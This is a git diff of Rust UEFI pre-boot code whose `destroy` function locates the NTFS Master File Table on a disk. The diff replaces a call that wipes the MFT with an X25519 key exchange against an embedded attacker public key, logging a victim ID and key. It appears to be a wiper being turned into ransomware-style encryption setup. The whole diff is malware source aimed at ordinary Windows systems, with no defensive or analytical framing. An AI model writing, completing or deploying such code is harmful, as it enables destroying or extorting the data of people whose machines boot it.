@@ -1,11 +1,14 @@
 use alloc::vec;
 use alloc::vec::Vec;
 use core::ops::Range;
+use core::str;
+use rand::rngs::OsRng;
 
 use uefi::prelude::SystemTable;
 use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
 use uefi::ResultExt;
+use x25519_dalek::{EphemeralSecret, PublicKey};
 
 const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -17,8 +20,7 @@ fn read_mft_entry(
     entry_buf: &mut [u8],
 ) -> Result<(), ()> {
     // Read the first half of the file record
-    blk.read_blocks(media_id, entry_nb, buf)
-        .unwrap_success();
+    blk.read_blocks(media_id, entry_nb, buf).unwrap_success();
 
     // If it doesn't start the file FILE signature then get out
     if &buf[0..4] != b"FILE" {
@@ -43,8 +45,7 @@ fn get_mft_ranges(
     buf: &mut [u8],
 ) -> Result<Vec<Range<u64>>, ()> {
     // Read Boot Sector, which is the first sector of NTFS partition
-    blk.read_blocks(media_id, boot_sector, buf)
-        .unwrap_success();
+    blk.read_blocks(media_id, boot_sector, buf).unwrap_success();
 
     // Get start sector of $MFT and $MFTMirr from Boot Sector
     let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
@@ -212,7 +213,27 @@ pub fn destroy(st: &SystemTable<Boot>) {
         }
 
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
-            beat_the_shit_out_of_the_mft(blk, media_id, ranges);
+            let public_key_hex = include_str!("include/public_key.hex");
+            let mut buf = [0u8; 32];
+            hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
+            let public_key = PublicKey::from(buf);
+
+            let rng = OsRng;
+            let secret = EphemeralSecret::new(rng);
+            let id = PublicKey::from(&secret);
+            let key = secret.diffie_hellman(&public_key);
+
+            let mut buf = [0u8; 64];
+            hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");
+            log::info!("ID :{}", str::from_utf8(&buf).unwrap());
+
+            hex::encode_to_slice(key.as_bytes(), &mut buf).expect("id to hex");
+            log::info!("KEY :{}", str::from_utf8(&buf).unwrap());
+
+            // TODO: Write id to ESP root
+
+            loop {}
+            //beat_the_shit_out_of_the_mft(blk, media_id, ranges);
             //log::info!("{:#?}", ranges); // DEBUG
         }
     }
